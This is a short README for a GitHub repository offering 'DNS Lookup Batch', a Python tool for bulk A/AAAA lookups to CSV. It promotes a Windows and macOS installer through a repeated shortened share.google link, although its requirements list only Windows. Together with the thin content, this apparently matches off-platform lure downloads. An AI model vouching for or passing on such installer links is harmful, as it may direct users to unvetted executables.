![DNS Lookup Batch](assets/hero.png)

# DNS Lookup Batch

*Bulk DNS, one table.*

## Overview

This repository is **DNS Lookup Batch**, a developer utility. Bulk DNS, one table.

A migration list needs current records, not one nslookup at a time.

Run it in a clone, check the output, then keep or discard the file it wrote.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Hostname list
- A and AAAA
- CSV
- Optional resolver

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/mcook6776/dns-lookup-batch

MIT license. See `LICENSE`.
